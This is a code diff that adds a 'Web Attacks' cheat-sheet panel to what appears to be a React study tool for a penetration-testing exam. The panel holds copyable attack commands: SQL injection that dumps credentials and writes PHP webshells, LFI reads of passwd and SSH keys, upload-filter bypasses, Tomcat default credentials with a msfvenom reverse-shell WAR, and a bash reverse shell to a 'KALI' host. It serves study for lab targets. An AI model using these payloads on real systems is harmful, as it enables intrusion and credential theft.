@@ -1870,6 +1870,131 @@ function PivotingPanel() {
   );
 }
 
+
+// ─── WEB ATTACKS REFERENCE PANEL ──────────────────────────
+function WebAttacksPanel() {
+  const [copied,setCopied] = useState(null);
+  const copy = (id,cmd) => { if(!cmd)return; navigator.clipboard.writeText(cmd).then(()=>{setCopied(id);setTimeout(()=>setCopied(null),1200)}).catch(()=>{}) };
+  const mono = "'JetBrains Mono',monospace";
+
+  const sections = [
+    { title: "1\ufe0f\u20e3 FIRST 5 MINUTES \u2014 RECON BEFORE TOOLS", scenario: "Visit the site like a human. Read every page, check source, identify the stack. THEN launch tools.", items: [
+      { id:"wb1", text:"Browse every page \u2014 read content, check footer/header for software names + versions", cmd:"# Firefox: view source (Ctrl+U), /robots.txt, /sitemap.xml, /.well-known/" },
+      { id:"wb2", text:"Check response headers for tech stack", cmd:"curl -v http://$IP/ 2>&1 | grep -iE 'server:|x-powered|set-cookie'" },
+      { id:"wb3", text:"Fingerprint web technology", cmd:"whatweb http://$IP" },
+      { id:"wb4", text:"Check SSL cert for hostnames (HTTPS)", cmd:"openssl s_client -connect $IP:443 2>/dev/null | openssl x509 -noout -text | grep -i dns" },
+      { id:"wb5", text:"Add discovered hostnames to /etc/hosts", cmd:"echo '$IP hostname.htb' | sudo tee -a /etc/hosts" },
+    ]},
+    { title: "2\ufe0f\u20e3 DIRECTORY & VHOST ENUMERATION", scenario: "Run in the background while you manually explore. Different wordlists find different things.", items: [
+      { id:"wb6", text:"Gobuster \u2014 primary dir brute + common extensions", cmd:"gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,zip,asp,aspx,jsp,old,conf -t 50 -o gobuster.txt" },
+      { id:"wb7", text:"Feroxbuster \u2014 recursive (finds nested dirs)", cmd:"feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -o ferox.txt" },
+      { id:"wb8", text:"IIS-specific extensions", cmd:"gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x asp,aspx,config,txt,html -t 50" },
+      { id:"wb9", text:"Vhost/subdomain enumeration (need domain name)", cmd:"gobuster vhost -u http://domain.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain" },
+      { id:"wb10", text:"ffuf vhost scan with size filter", cmd:"ffuf -u http://domain.htb -H 'Host: FUZZ.domain.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0" },
+      { id:"wb11", text:"Check for exposed .git repo", cmd:"curl -s http://$IP/.git/HEAD && python3 git-dumper.py http://$IP/.git/ ./git-output && cd git-output && git log -p" },
+      { id:"wb12", text:"Nikto in background", cmd:"nikto -h http://$IP -o nikto.txt &" },
+    ]},
+    { title: "3\ufe0f\u20e3 CMS DETECTION & ATTACK", scenario: "Identify the CMS and use targeted tools. Plugin/theme vulns are the #1 web foothold vector.", items: [
+      { id:"wb13", text:"WordPress \u2014 enumerate plugins, themes, users", cmd:"wpscan --url http://$IP --enumerate ap,at,u --api-token $WPSCAN_TOKEN" },
+      { id:"wb14", text:"WordPress admin \u2192 RCE via Theme Editor \u2192 404.php", cmd:"# Appearance > Theme Editor > 404.php > paste PHP rev shell > visit /wp-content/themes/THEME/404.php" },
+      { id:"wb15", text:"WordPress brute force", cmd:"wpscan --url http://$IP --usernames admin --passwords /usr/share/wordlists/rockyou.txt" },
+      { id:"wb16", text:"Tomcat default creds on /manager/html", cmd:"# tomcat:s3cret | tomcat:tomcat | admin:admin | admin:password | role1:tomcat" },
+      { id:"wb17", text:"Tomcat \u2014 deploy WAR shell", cmd:"msfvenom -p java/shell_reverse_tcp LHOST=$KALI LPORT=443 -f war -o shell.war && curl -u 'tomcat:s3cret' --upload-file shell.war 'http://$IP:8080/manager/text/deploy?path=/shell'" },
+      { id:"wb18", text:"Jenkins \u2014 check /script, /signup, /asynchPeople/", cmd:"curl -s http://$IP:8080/script && curl -s http://$IP:8080/signup" },
+      { id:"wb19", text:"Joomla \u2014 CVE-2023-23752 unauthenticated info disclosure", cmd:"curl -s http://$IP/api/index.php/v1/config/application?public=true | python3 -m json.tool" },
+      { id:"wb20", text:"Drupal version + droopescan", cmd:"curl -s http://$IP/CHANGELOG.txt | head -5 && droopescan scan drupal -u http://$IP" },
+      { id:"wb21", text:"Joomla scanner", cmd:"joomscan -u http://$IP" },
+    ]},
+    { title: "4\ufe0f\u20e3 SQL INJECTION (Manual)", scenario: "Test EVERY input: login forms, search, URL params (?id=), cookies, headers. No SQLMap \u2014 all manual.", items: [
+      { id:"wb22", text:"Detection \u2014 single quote on every input", cmd:"' OR 1=1-- -" },
+      { id:"wb23", text:"UNION \u2014 find column count (increment until error)", cmd:"?id=1 ORDER BY 5-- -" },
+      { id:"wb24", text:"UNION \u2014 find visible columns", cmd:"?id=-1 UNION SELECT 1,2,3,4-- -" },
+      { id:"wb25", text:"UNION \u2014 extract DB + user", cmd:"?id=-1 UNION SELECT 1,database(),user(),4-- -" },
+      { id:"wb26", text:"UNION \u2014 list tables", cmd:"?id=-1 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -" },
+      { id:"wb27", text:"UNION \u2014 dump creds", cmd:"?id=-1 UNION SELECT 1,group_concat(username,':',password),3,4 FROM users-- -" },
+      { id:"wb28", text:"Blind boolean extraction", cmd:"?id=1 AND SUBSTRING(database(),1,1)='a'-- -" },
+      { id:"wb29", text:"Time-based blind", cmd:"?id=1 AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)-- -" },
+      { id:"wb30", text:"MySQL \u2192 webshell via INTO OUTFILE", cmd:"?id=-1 UNION SELECT 1,'<?php system($_GET[cmd]); ?>',3,4 INTO OUTFILE '/var/www/html/shell.php'-- -" },
+      { id:"wb31", text:"MSSQL \u2192 enable xp_cmdshell", cmd:"'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';-- -" },
+      { id:"wb32", text:"MSSQL \u2192 NTLM theft (Responder first!)", cmd:"'; EXEC xp_dirtree '\\\\KALI\\share';-- -" },
+      { id:"wb33", text:"PostgreSQL \u2192 RCE via COPY", cmd:"'; CREATE TABLE cmd_output(o text); COPY cmd_output FROM PROGRAM 'id'; SELECT * FROM cmd_output;-- -" },
+    ]},
+    { title: "5\ufe0f\u20e3 LFI / RFI", scenario: "Params like ?page=, ?file=, ?lang= that change page content = test for path traversal.", items: [
+      { id:"wb34", text:"Basic LFI \u2014 Linux", cmd:"?page=../../../etc/passwd" },
+      { id:"wb35", text:"Bypass \u2014 double traversal", cmd:"?page=....//....//....//etc/passwd" },
+      { id:"wb36", text:"Bypass \u2014 URL encode", cmd:"?page=..%2f..%2f..%2f..%2fetc/passwd" },
+      { id:"wb37", text:"LFI \u2014 Windows", cmd:"?page=..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts" },
+      { id:"wb38", text:"PHP filter \u2014 read source as base64", cmd:"?page=php://filter/convert.base64-encode/resource=config.php" },
+      { id:"wb39", text:"Log poisoning \u2014 inject PHP in User-Agent then include log", cmd:"curl -A '<?php system($_GET[cmd]); ?>' http://$IP/ && curl 'http://$IP/?page=/var/log/apache2/access.log&cmd=id'" },
+      { id:"wb40", text:"data:// wrapper RCE", cmd:"?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id" },
+      { id:"wb41", text:"SSH key theft via LFI", cmd:"?page=../../../home/USER/.ssh/id_rsa" },
+      { id:"wb42", text:"Windows cred files", cmd:"?page=C:\\Windows\\Panther\\Unattend.xml" },
+      { id:"wb43", text:"RFI test", cmd:"?page=http://KALI/shell.php&cmd=id" },
+    ]},
+    { title: "6\ufe0f\u20e3 FILE UPLOAD", scenario: "Any upload = potential webshell. Try simple first, then bypass filters one at a time in Burp.", items: [
+      { id:"wb44", text:"Simple PHP webshell", cmd:"echo '<?php system($_GET[cmd]); ?>' > shell.php" },
+      { id:"wb45", text:"Extension bypass alternatives", cmd:"# .phtml .pHp .php3 .php5 .phar .php.jpg .php%00.jpg" },
+      { id:"wb46", text:"Content-Type bypass in Burp", cmd:"# Change Content-Type: application/x-php to image/jpeg" },
+      { id:"wb47", text:"Magic bytes bypass \u2014 GIF header", cmd:"printf 'GIF89a;\\n<?php system($_GET[cmd]); ?>' > shell.php.gif" },
+      { id:"wb48", text:".htaccess trick (Apache)", cmd:"echo 'AddType application/x-httpd-php .evil' > .htaccess" },
+      { id:"wb49", text:"Common upload dirs", cmd:"# /uploads/ /upload/ /files/ /images/ /media/ /wp-content/uploads/" },
+    ]},
+    { title: "7\ufe0f\u20e3 CMD INJECTION / SSTI / SSRF / XXE / API", scenario: "Command injection: ping/DNS features. SSTI: reflected input. SSRF: URL params. XXE: XML input. API: /api/ endpoints.", items: [
+      { id:"wb50", text:"Command injection \u2014 test all separators", cmd:"; id | id || id & id && id $(id) `id` %0aid" },
+      { id:"wb51", text:"Space bypass", cmd:"cat${IFS}/etc/passwd    {cat,/etc/passwd}" },
+      { id:"wb52", text:"URL-encoded reverse shell", cmd:";bash+-c+'bash+-i+>%26+/dev/tcp/KALI/443+0>%261'" },
+      { id:"wb53", text:"SSTI detection", cmd:"{{7*7}}  ${7*7}  <%= 7*7 %>  #{7*7}" },
+      { id:"wb54", text:"Jinja2 RCE (Flask)", cmd:"{{ cycler.__init__.__globals__.os.popen('id').read() }}" },
+      { id:"wb55", text:"SSRF \u2014 fuzz internal ports", cmd:"ffuf -u 'http://$IP/fetch?url=http://127.0.0.1:FUZZ' -w <(seq 1 10000) -fs 0 -t 50" },
+      { id:"wb56", text:"XXE \u2014 read files via XML entity", cmd:"<?xml version=\"1.0\"?><!DOCTYPE f [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>" },
+      { id:"wb57", text:"API \u2014 fuzz endpoints", cmd:"ffuf -u http://$IP/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc 200,201,301,403" },
+      { id:"wb58", text:"API \u2014 IDOR test", cmd:"for i in $(seq 0 20); do echo \"=== $i ===\"; curl -s http://$IP/api/user/$i; done" },
+      { id:"wb59", text:"API \u2014 mass assignment", cmd:"curl http://$IP/api/register -X POST -H 'Content-Type: application/json' -d '{\"username\":\"a\",\"password\":\"b\",\"role\":\"admin\"}'" },
+    ]},
+    { title: "\u26a1 WEB ATTACK PRIORITY ORDER", scenario: "Work top-to-bottom on every web service. Stop and exploit as soon as you find something.", items: [
+      { id:"wbp1", text:"1. IDENTIFY TECH \u2192 whatweb + source + headers (30s)" },
+      { id:"wbp2", text:"2. SEARCHSPLOIT exact version \u2192 known CVE? (1 min)", cmd:"searchsploit apache 2.4.49" },
+      { id:"wbp3", text:"3. DEFAULT CREDS \u2192 admin:admin, CMS defaults (2 min)" },
+      { id:"wbp4", text:"4. DIR BRUTE \u2192 gobuster/ferox in background" },
+      { id:"wbp5", text:"5. TEST EVERY INPUT \u2192 SQLi, LFI, cmd injection, SSTI" },
+      { id:"wbp6", text:"6. FILE UPLOAD \u2192 webshell + bypasses" },
+      { id:"wbp7", text:"7. API TESTING \u2192 IDOR, auth bypass" },
+      { id:"wbp8", text:"8. VHOST SCAN \u2192 hidden subdomains" },
+      { id:"wbp9", text:"9. CRED REUSE \u2192 spray creds from other machines" },
+      { id:"wbp10", text:"\u26a0\ufe0f 30 MIN STUCK? Re-run gobuster w/ raft wordlist, add extensions, bigger wordlist, RE-READ the page" },
+    ]},
+  ];
+
+  return (
+    <div style={{borderBottom:"1px solid rgba(255,136,0,0.15)",background:"rgba(0,0,0,0.25)",maxHeight:"70vh",overflowY:"auto"}}>
+      <div style={{padding:"8px 14px",display:"flex",justifyContent:"space-between",alignItems:"center",borderBottom:"1px solid rgba(255,136,0,0.08)",position:"sticky",top:0,background:"rgba(10,15,20,0.97)",zIndex:2}}>
+        <span style={{fontSize:12,fontWeight:800,fontFamily:mono,color:"#ff8800",letterSpacing:1}}>{"\uD83C\uDF10"} WEB APPLICATION ATTACK REFERENCE</span>
+      </div>
+      <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fit, minmax(420px, 1fr))",gap:0}}>
+        {sections.map(sec=>(
+          <div key={sec.title} style={{borderRight:"1px solid rgba(100,130,160,0.06)",borderBottom:"1px solid rgba(100,130,160,0.06)"}}>
+            <div style={{padding:"6px 10px",background:"rgba(255,136,0,0.03)",borderBottom:"1px solid rgba(255,136,0,0.06)"}}>
+              <span style={{fontSize:10,fontWeight:700,fontFamily:mono,color:"#ff8800"}}>{sec.title}</span>
+            </div>
+            {sec.scenario&&<div style={{padding:"4px 10px",background:"rgba(255,136,0,0.02)",borderBottom:"1px solid rgba(100,130,160,0.04)"}}>
+              <span style={{fontSize:9.5,fontFamily:mono,color:"#7799aa",lineHeight:1.5}}>{sec.scenario}</span>
+            </div>}
+            {sec.items.map(item=>(
+              <div key={item.id} style={{display:"flex",alignItems:"flex-start",gap:6,padding:"4px 10px",borderBottom:"1px solid rgba(100,130,160,0.03)"}}>
+                <div style={{flex:1,minWidth:0}}>
+                  <div style={{fontSize:10.5,fontFamily:mono,color:"#e8edf2",lineHeight:1.4}}>{item.text}</div>
+                  {item.cmd&&<div style={{fontSize:10,fontFamily:mono,color:"#6b7f94",lineHeight:1.4,wordBreak:"break-all"}}>{item.cmd}</div>}
+                </div>
+                {item.cmd&&<button onClick={()=>copy(item.id,item.cmd)} title="Copy" style={{background:copied===item.id?"rgba(255,136,0,0.15)":"none",border:"none",color:copied===item.id?"#ff8800":"#445566",cursor:"pointer",padding:"2px 5px",fontSize:11,fontFamily:mono,flexShrink:0}}>{copied===item.id?"\u2713":"\u29c9"}</button>}
+              </div>
+            ))}
+          </div>
+        ))}
+      </div>
+    </div>
+  );
+}
+
 // ─── CRACKING REFERENCE PANEL ─────────────────────────────
 function CrackingPanel() {
   const [copied,setCopied] = useState(null);
@@ -2190,6 +2315,7 @@ export default function App() {
   const [showCracking,setShowCracking] = useState(false);
   const [showTransfers,setShowTransfers] = useState(false);
   const [showPivoting,setShowPivoting] = useState(false);
+  const [showWeb,setShowWeb] = useState(false);
   const [showPreCheck,setShowPreCheck] = useState(false);
   const [showReset,setShowReset] = useState(false);
   const [examStart,setExamStart] = useState(saved.examStart||null);
@@ -2284,6 +2410,7 @@ export default function App() {
           <button onClick={()=>setShowCracking(!showCracking)} style={{background:showCracking?"rgba(255,170,0,0.1)":"rgba(100,130,160,0.06)",border:`1px solid ${showCracking?"rgba(255,170,0,0.25)":"rgba(100,130,160,0.1)"}`,color:showCracking?"#ffaa00":"#556677",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}}>🔓 CRACKING</button>
           <button onClick={()=>setShowTransfers(!showTransfers)} style={{background:showTransfers?"rgba(68,170,255,0.1)":"rgba(100,130,160,0.06)",border:`1px solid ${showTransfers?"rgba(68,170,255,0.25)":"rgba(100,130,160,0.1)"}`,color:showTransfers?"#44aaff":"#556677",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}}>📦 TRANSFERS</button>
           <button onClick={()=>setShowPivoting(!showPivoting)} style={{background:showPivoting?"rgba(0,255,170,0.1)":"rgba(100,130,160,0.06)",border:`1px solid ${showPivoting?"rgba(0,255,170,0.25)":"rgba(100,130,160,0.1)"}`,color:showPivoting?"#00ffaa":"#556677",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}}>🔀 PIVOTING</button>
+          <button onClick={()=>setShowWeb(!showWeb)} style={{background:showWeb?"rgba(255,136,0,0.1)":"rgba(100,130,160,0.06)",border:`1px solid ${showWeb?"rgba(255,136,0,0.25)":"rgba(100,130,160,0.1)"}`,color:showWeb?"#ff8800":"#556677",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}}>🌐 WEB</button>
           <button onClick={()=>setShowPreCheck(!showPreCheck)} style={{background:showPreCheck?"rgba(170,130,255,0.1)":"rgba(100,130,160,0.06)",border:`1px solid ${showPreCheck?"rgba(170,130,255,0.25)":"rgba(100,130,160,0.1)"}`,color:showPreCheck?"#aa88ff":"#556677",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}}>🛡️ PRE-CHECK</button>
           <button onClick={()=>{const s=getStarred();const t=s.map(x=>`[${x.machine}] ${x.item}${x.note?" — "+x.note:""}`).join("\n");navigator.clipboard.writeText(t).catch(()=>{})}} style={{background:"rgba(255,170,0,0.06)",border:"1px solid rgba(255,170,0,0.15)",color:"#887733",borderRadius:3,padding:"3px 9px",cursor:"pointer",fontSize:9,fontFamily:mono}} title="Copy starred items for report">★ EXPORT</button>
         </div>
@@ -2302,6 +2429,7 @@ export default function App() {
       {showCracking&&<CrackingPanel/>}
       {showTransfers&&<TransfersPanel/>}
       {showPivoting&&<PivotingPanel/>}
+      {showWeb&&<WebAttacksPanel/>}
       {showPreCheck&&<PreEngagementPanel/>}
 
       {/* Tabs */}
